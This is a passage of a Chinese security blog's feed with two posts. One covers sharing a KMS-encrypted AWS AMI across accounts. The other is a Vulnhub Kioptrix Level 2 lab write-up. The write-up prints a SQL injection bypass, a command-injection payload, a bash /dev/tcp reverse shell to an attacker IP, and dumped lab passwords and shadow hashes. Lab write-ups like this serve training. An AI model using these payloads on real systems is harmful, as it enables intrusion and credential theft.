        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;分享几个关于NLB的有趣问题。&lt;/p&gt;
&lt;h2 id=&quot;0x01-架构概述&quot;&gt;&lt;a href=&quot;#0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>KMS：如果A账号的AMI使用AWS managed key加密需要将其共享给B账号应该如何操作？</title>
    <link href="https://tonghuaroot.com/2019/10/25/AWS-KMS-Encryption-AMI-Share-to-B-account/"/>
    <id>https://tonghuaroot.com/2019/10/25/AWS-KMS-Encryption-AMI-Share-to-B-account/</id>
    <published>2019-10-25T00:47:21.000Z</published>
    <updated>2019-10-25T08:59:27.024Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-场景分析"><a href="#0x00-场景分析" class="headerlink" title="0x00 场景分析"></a>0x00 场景分析</h2><p>当前为A账号，我使用AWS中国区的KMS服务的AWS managed key加密了我的AMI，但是因为各种原因，我现在需要将我的AMI共享给B账号，应该如何操作？</p><h2 id="0x01-操作步骤简述"><a href="#0x01-操作步骤简述" class="headerlink" title="0x01 操作步骤简述"></a>0x01 操作步骤简述</h2><p>AWS managed key是没有权限共享给其他账号的，因此思路就是复制AMI，修改其KMS加密Key为Customer managed keys，然后修改该Key的Policy，然后再将AMI共享给其他账号。</p><h2 id="0x02-详细操作步骤"><a href="#0x02-详细操作步骤" class="headerlink" title="0x02 详细操作步骤"></a>0x02 详细操作步骤</h2><p>首先在A账号下做一个使用AWS managed key加密的ami：</p><p><img src="510C7A99389343C4A06F3B113269CBEA" alt="image"></p><p><img src="5E2F1635A0A2401C8A953B3A916C3776" alt="image"></p><p>这个时候，我们直接将该AMI共享给B账号，是直接失败的，会提示如下错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Snapshots encrypted with the AWS Managed CMK can’t be shared. Specify another snapshot. (Service: AmazonEC2; Status Code: 400; Error Code: InvalidParameter; Request ID: d456dde3-1a1c-4426-886b-5cb6705d44ff),Encrypted snapshots with EBS default key cannot be shared (Service: AmazonEC2; Status Code: 400; Error Code: OperationNotPermitted; Request ID: 4bb6d1c1-3526-40fd-8631-12e277dc4644)</span><br></pre></td></tr></table></figure></p><p><img src="7624A8C955134B25A6114C534E7A036E" alt="image"></p><p><img src="AECDF412C296404E8CD7D224467588B3" alt="image"></p><p>为了解决这个问题，我们需要复制该AMI，同时，此时的加密KMS Key应该替换为Customer managed key。操作步骤如下：</p><p><img src="BCCDD9E337B94F52BB4C2EDE8527EE5B" alt="image"></p><p><img src="A7484014D8F94450B6C5B6A583213143" alt="image"></p><p>同时要保证B账号有使用该KMS Key加解密的权限。</p><p>示例Policy如下（本着最小权限的原则）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;Id&quot;: &quot;key-consolepolicy-3&quot;,</span><br><span class="line">    &quot;Version&quot;: &quot;2012-10-17&quot;,</span><br><span class="line">    &quot;Statement&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;Enable IAM User Permissions&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Principal&quot;: &#123;</span><br><span class="line">                &quot;AWS&quot;: &quot;arn:aws-cn:iam::1234567890123:root&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Action&quot;: &quot;kms:*&quot;,</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;Allow access for Key Administrators&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Principal&quot;: &#123;</span><br><span class="line">                &quot;AWS&quot;: &quot;arn:aws-cn:iam::1234567890123:user/shanchl&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Action&quot;: [</span><br><span class="line">                &quot;kms:Create*&quot;,</span><br><span class="line">                &quot;kms:Describe*&quot;,</span><br><span class="line">                &quot;kms:Enable*&quot;,</span><br><span class="line">                &quot;kms:List*&quot;,</span><br><span class="line">                &quot;kms:Put*&quot;,</span><br><span class="line">                &quot;kms:Update*&quot;,</span><br><span class="line">                &quot;kms:Revoke*&quot;,</span><br><span class="line">                &quot;kms:Disable*&quot;,</span><br><span class="line">                &quot;kms:Get*&quot;,</span><br><span class="line">                &quot;kms:Delete*&quot;,</span><br><span class="line">                &quot;kms:TagResource&quot;,</span><br><span class="line">                &quot;kms:UntagResource&quot;,</span><br><span class="line">                &quot;kms:ScheduleKeyDeletion&quot;,</span><br><span class="line">                &quot;kms:CancelKeyDeletion&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;Allow use of the key&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Principal&quot;: &#123;</span><br><span class="line">                &quot;AWS&quot;: [</span><br><span class="line">                    &quot;arn:aws-cn:iam::1234567890123:user/shanchl&quot;,</span><br><span class="line">                    &quot;arn:aws-cn:iam::1234567890xxx:root&quot;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Action&quot;: [</span><br><span class="line">                &quot;kms:Encrypt&quot;,</span><br><span class="line">                &quot;kms:Decrypt&quot;,</span><br><span class="line">                &quot;kms:ReEncrypt*&quot;,</span><br><span class="line">                &quot;kms:GenerateDataKey*&quot;,</span><br><span class="line">                &quot;kms:DescribeKey&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;Sid&quot;: &quot;Allow attachment of persistent resources&quot;,</span><br><span class="line">            &quot;Effect&quot;: &quot;Allow&quot;,</span><br><span class="line">            &quot;Principal&quot;: &#123;</span><br><span class="line">                &quot;AWS&quot;: [</span><br><span class="line">                    &quot;arn:aws-cn:iam::1234567890123:user/shanchl&quot;,</span><br><span class="line">                    &quot;arn:aws-cn:iam::1234567890xxx:root&quot;</span><br><span class="line">                ]</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Action&quot;: [</span><br><span class="line">                &quot;kms:CreateGrant&quot;,</span><br><span class="line">                &quot;kms:ListGrants&quot;,</span><br><span class="line">                &quot;kms:RevokeGrant&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Resource&quot;: &quot;*&quot;,</span><br><span class="line">            &quot;Condition&quot;: &#123;</span><br><span class="line">                &quot;Bool&quot;: &#123;</span><br><span class="line">                    &quot;kms:GrantIsForAWSResource&quot;: &quot;true&quot;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果对这个Policy不熟悉的话，直接在控制台添加账号ID即可：</p><p><img src="78B292F28F894296A1F9299C8C798EA9" alt="image"></p><p>有KMS Key的权限的话，可以直接启动EC2实例，如果没有权限的话，启动成功但是会被terminated掉。</p><p><img src="F270AF1EA67B43559ADB75154E08717C" alt="image"></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>这个有两个坑点：</p><ol><li>我以为可以直接分享AWS Managed key加密的AMI，然后运行的时候报没权限，实际测试下来当我分享的时候就直接报错了。</li><li>我以为加密的AMI共享成功，但是没有KMS CMK的访问权限的话，启动实例的时候会报没有权限的错误，但是实际测试下来，是实例可以正常启动，但是会被瞬间terminated掉。<br>interesting</li></ol><h2 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h2><ul><li><a href="https://aws.amazon.com/premiumsupport/knowledge-center/kms-cmk-policy-error-invalid-principals/?nc1=h_ls" target="_blank" rel="noopener">How can I resolve the CMK key policy error “Policy contains a statement with one or more invalid principals”?</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-场景分析&quot;&gt;&lt;a href=&quot;#0x00-场景分析&quot; class=&quot;headerlink&quot; title=&quot;0x00 场景分析&quot;&gt;&lt;/a&gt;0x00 场景分析&lt;/h2&gt;&lt;p&gt;当前为A账号，我使用AWS中国区的KMS服务的AWS managed key加密了我
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>OSCP:Vulnhub Kioptrix Level 2 Writeup</title>
    <link href="https://tonghuaroot.com/2019/10/13/OSCP-Vulnhub-Kioptrix-Level-2-Writeup/"/>
    <id>https://tonghuaroot.com/2019/10/13/OSCP-Vulnhub-Kioptrix-Level-2-Writeup/</id>
    <published>2019-10-13T20:19:18.000Z</published>
    <updated>2019-10-14T04:19:49.285Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>这篇文章的靶机环境为：<a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/" target="_blank" rel="noopener">Kioptrix: Level 1.1 (#2)</a></p><h2 id="0x01-渗透思路"><a href="#0x01-渗透思路" class="headerlink" title="0x01 渗透思路"></a>0x01 渗透思路</h2><p>扫描端口，发现Web应用，SQL Injection，OS Command Injection，反弹shell，内核漏洞提权，get root!</p><h2 id="0x02-用到的工具"><a href="#0x02-用到的工具" class="headerlink" title="0x02 用到的工具"></a>0x02 用到的工具</h2><h3 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netdiscover</span><br><span class="line">nmap</span><br><span class="line">nc</span><br></pre></td></tr></table></figure><h3 id="exploits"><a href="#exploits" class="headerlink" title="exploits"></a>exploits</h3><ul><li><a href="https://www.exploit-db.com/exploits/9542" target="_blank" rel="noopener">Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - ‘ip_append_data()’ Ring0 Privilege Escalation (1)</a></li></ul><h2 id="0x03-渗透过程"><a href="#0x03-渗透过程" class="headerlink" title="0x03 渗透过程"></a>0x03 渗透过程</h2><p>靶机运行起来大概长这样：</p><p><img src="3937573A061C47F8B296BB6E9CBE3289" alt="image"></p><h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>netdiscover 做内网主机发现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0</span><br></pre></td></tr></table></figure><p><img src="B3536DF8BB084B98B2CAE359B1B03743" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Currently scanning: 172.16.179.0/16   |   Screen View: Unique Hosts            </span><br><span class="line">                                                                               </span><br><span class="line">10 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 600               </span><br><span class="line">_____________________________________________________________________________</span><br><span class="line">  IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line">-----------------------------------------------------------------------------</span><br><span class="line">192.168.199.1   d4:ee:07:59:a6:ec      6     360  HIWIFI Co., Ltd.             </span><br><span class="line">192.168.199.126 90:f0:52:68:7a:ac      1      60  MEIZU Technology Co., Ltd.   </span><br><span class="line">192.168.199.219 98:22:ef:fc:5c:13      1      60  Liteon Technology Corporation</span><br><span class="line">192.168.199.170 00:0c:29:53:19:4c      2     120  VMware, Inc.</span><br></pre></td></tr></table></figure><p>192.168.199.170就是我们的靶机IP了。</p><p>nmap全端口扫描走一波：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -sV -T4 -A -Pn -oX Kioptrix_level_2.xml 192.168.199.170</span><br></pre></td></tr></table></figure></p><p><img src="B11BE0877E6F45CEB28D9D8BCEE343D0" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -p- -sV -T4 -A -Pn -oX Kioptrix_level_2.xml 192.168.199.170</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-13 22:30 EDT</span><br><span class="line">Nmap scan report for 192.168.199.170</span><br><span class="line">Host is up (0.0013s latency).</span><br><span class="line">Not shown: 65528 closed ports</span><br><span class="line">PORT     STATE SERVICE    VERSION</span><br><span class="line">22/tcp   open  ssh        OpenSSH 3.9p1 (protocol 1.99)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)</span><br><span class="line">|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)</span><br><span class="line">|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">80/tcp   open  http       Apache httpd 2.0.52 ((CentOS))</span><br><span class="line">|_http-server-header: Apache/2.0.52 (CentOS)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html; charset=UTF-8).</span><br><span class="line">111/tcp  open  rpcbind    2 (RPC #100000)</span><br><span class="line">443/tcp  open  ssl/https?</span><br><span class="line">|_ssl-date: 2019-10-13T23:22:09+00:00; -3h09m43s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_WITH_MD5</span><br><span class="line">|_    SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">631/tcp  open  ipp        CUPS 1.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: PUT</span><br><span class="line">|_http-server-header: CUPS/1.1</span><br><span class="line">|_http-title: 403 Forbidden</span><br><span class="line">673/tcp  open  status     1 (RPC #100024)</span><br><span class="line">3306/tcp open  mysql      MySQL (unauthorized)</span><br><span class="line">MAC Address: 00:0C:29:53:19:4C (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -3h09m43s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.26 ms 192.168.199.170</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 114.78 seconds</span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure><h3 id="Web-APP-SQL-Injection-and-OS-Command-Injection"><a href="#Web-APP-SQL-Injection-and-OS-Command-Injection" class="headerlink" title="Web APP SQL Injection and OS Command Injection"></a>Web APP SQL Injection and OS Command Injection</h3><p><img src="457665A55FD147DEB2A30078FFF639D2" alt="image"></p><p>看着就像SQL Injection，试一下果然有，可以直接注入进后台：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p><img src="DA3A56332BC946168C6E3A12280E47E3" alt="image"></p><p>看着就像是一个OS Command Injection，试一下果然有，大雾。。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.199.1 | cat /etc/passwd</span><br></pre></td></tr></table></figure><p><img src="766C5405ED8D4725B4BE17ECC4B06BB6" alt="image"></p><p>反弹shell过来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.199.1 | bash -i &gt;&amp; /dev/tcp/192.168.199.166/443 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p><p><img src="EABFC7A349C043F6813FADA1C5D9FB08" alt="image"></p><p>基于kernel版本找对应的exploit：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit linux kernel 2.6</span><br></pre></td></tr></table></figure></p><p><img src="A38679529E664A1586FAD1BC1D84C58E" alt="image"></p><p>用这个本地提权的exploit：<a href="https://www.exploit-db.com/exploits/9542" target="_blank" rel="noopener">Linux Kernel 2.6 &lt; 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - ‘ip_append_data()’ Ring0 Privilege Escalation (1)</a></p><p>去/tmp目录下，有写文件的权限</p><p><img src="8569ADB7C2E24E2FA0B27CD2618CC847" alt="image"></p><p>拿到root权限了</p><p><img src="F90F7CB4D8F4439597251E37782D3731" alt="image"></p><p>信息收集：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">sh-3.00# find / -name &apos;.mysql_history&apos;</span><br><span class="line">/root/.mysql_history</span><br><span class="line">/home/john/.mysql_history</span><br><span class="line">sh-3.00# cat /root/.mysql_history</span><br><span class="line">show databases;</span><br><span class="line">create database webapp;</span><br><span class="line">use webapp;</span><br><span class="line">create table users(id INT,username varchar(100),password varchar(10));</span><br><span class="line">show database;</span><br><span class="line">select * from users;</span><br><span class="line">show databases;</span><br><span class="line">use webapp;</span><br><span class="line">insert into users values(1,&apos;admin&apos;,&apos;hello&apos;);</span><br><span class="line">select * from users;</span><br><span class="line">use mysql</span><br><span class="line">show databases;</span><br><span class="line">use mysql;</span><br><span class="line">select * from users where user=john;</span><br><span class="line">show tables;</span><br><span class="line">select * from user where user=john;</span><br><span class="line">select * from user where user=&apos;john&apos;;</span><br><span class="line">select * from user;</span><br><span class="line">create user &apos;john&apos;@&apos;localhost&apos; identified by &apos;hiroshima&apos;;</span><br><span class="line">create user &apos;webapp&apos;@&apos;localhost&apos; identified by &apos;hiroshima&apos;;</span><br><span class="line">create user &apos;webapp&apos;@&apos;localhost&apos; IDENTIFIED BY &apos;hiroshima&apos;;</span><br><span class="line">CREATE USER &apos;webapp&apos;@&apos;localhost&apos; identified by &apos;hiroshima&apos;;</span><br><span class="line">update user set password = password(&apos;hiroshima&apos;) where user = &apos;john&apos;;</span><br><span class="line">use mysql;</span><br><span class="line">show users;</span><br><span class="line">select * from user;</span><br><span class="line">create user &apos;john&apos;@&apos;localhost&apos; identified by &apos;hiroshima&apos;;</span><br><span class="line">version;</span><br><span class="line">-v</span><br><span class="line">;</span><br><span class="line">help</span><br><span class="line">flush privileges;</span><br><span class="line">show databases;</span><br><span class="line">use mysql;</span><br><span class="line">grant select,insert,update,delete on *.* to &apos;john&apos;@&apos;localhost&apos;;</span><br><span class="line">update user set password = password(&apos;hiroshima&apos;) where user = &apos;john&apos;;</span><br><span class="line">flush priveleges;</span><br><span class="line">use webapp;</span><br><span class="line">show tables;</span><br><span class="line">update user set password = password(&apos;Ha56!blaKAbl&apos;) where user = &apos;admin&apos;;</span><br><span class="line">update username set password = password(&apos;Ha56!blaKAbl&apos;) where user = &apos;admin&apos;;</span><br><span class="line">select * from users;</span><br><span class="line">update username set password = password(&apos;Ha56!blaKAbl&apos;) where username = &apos;admin&apos;;</span><br><span class="line">update users set password = password(&apos;Ha56!blaKAbl&apos;) where username = &apos;admin&apos;;</span><br><span class="line">select * from users;</span><br><span class="line">insert into users values(2,&apos;john&apos;,&apos;66lajGGbla&apos;);</span><br><span class="line">select * from users;</span><br><span class="line">sh-3.00# cat /home/john/.mysql_history</span><br><span class="line">show databases;</span><br><span class="line">sh-3.00#</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">sh-3.00# cat /etc/shadow</span><br><span class="line">root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::</span><br><span class="line">bin:*:14525:0:99999:7:::</span><br><span class="line">daemon:*:14525:0:99999:7:::</span><br><span class="line">adm:*:14525:0:99999:7:::</span><br><span class="line">lp:*:14525:0:99999:7:::</span><br><span class="line">sync:*:14525:0:99999:7:::</span><br><span class="line">shutdown:*:14525:0:99999:7:::</span><br><span class="line">halt:*:14525:0:99999:7:::</span><br><span class="line">mail:*:14525:0:99999:7:::</span><br><span class="line">news:*:14525:0:99999:7:::</span><br><span class="line">uucp:*:14525:0:99999:7:::</span><br><span class="line">operator:*:14525:0:99999:7:::</span><br><span class="line">games:*:14525:0:99999:7:::</span><br><span class="line">gopher:*:14525:0:99999:7:::</span><br><span class="line">ftp:*:14525:0:99999:7:::</span><br><span class="line">nobody:*:14525:0:99999:7:::</span><br><span class="line">dbus:!!:14525:0:99999:7:::</span><br><span class="line">vcsa:!!:14525:0:99999:7:::</span><br><span class="line">rpm:!!:14525:0:99999:7:::</span><br><span class="line">haldaemon:!!:14525:0:99999:7:::</span><br><span class="line">netdump:!!:14525:0:99999:7:::</span><br><span class="line">nscd:!!:14525:0:99999:7:::</span><br><span class="line">sshd:!!:14525:0:99999:7:::</span><br><span class="line">rpc:!!:14525:0:99999:7:::</span><br><span class="line">mailnull:!!:14525:0:99999:7:::</span><br><span class="line">smmsp:!!:14525:0:99999:7:::</span><br><span class="line">rpcuser:!!:14525:0:99999:7:::</span><br><span class="line">nfsnobody:!!:14525:0:99999:7:::</span><br><span class="line">pcap:!!:14525:0:99999:7:::</span><br><span class="line">apache:!!:14525:0:99999:7:::</span><br><span class="line">squid:!!:14525:0:99999:7:::</span><br><span class="line">webalizer:!!:14525:0:99999:7:::</span><br><span class="line">xfs:!!:14525:0:99999:7:::</span><br><span class="line">ntp:!!:14525:0:99999:7:::</span><br><span class="line">pegasus:!!:14525:0:99999:7:::</span><br><span class="line">mysql:!!:14525::::::</span><br><span class="line">john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::</span><br><span class="line">harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::</span><br><span class="line">sh-3.00#</span><br></pre></td></tr></table></figure><h2 id="0x04-待解决的问题"><a href="#0x04-待解决的问题" class="headerlink" title="0x04 待解决的问题"></a>0x04 待解决的问题</h2><ul><li>基于kernel版本号自动化找到可以利用的exploit</li><li>“Text flag”没翻到，找了几个之前的writeup也没说到这个</li></ul><h2 id="0x05-后记"><a href="#0x05-后记" class="headerlink" title="0x05 后记"></a>0x05 后记</h2><p>做Web渗透的，这种属于送分题了，没啥说的。</p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><ul><li><a href="https://blog.g0tmi1k.com/2011/02/kioptrix-level-2-injection/" target="_blank" rel="noopener">Kioptrix - Level 2 (Injection)</a></li><li><a href="http://www.gcura.tech/vulnhub-kioptrix-level-1-1-2/" target="_blank" rel="noopener">Vulnhub – Kioptrix: Level 1.1 (#2)</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;这篇文章的靶机环境为：&lt;a href=&quot;https://www.vulnhub.com/entry/
      
    
    </summary>
    
    
  </entry>
  
</feed>
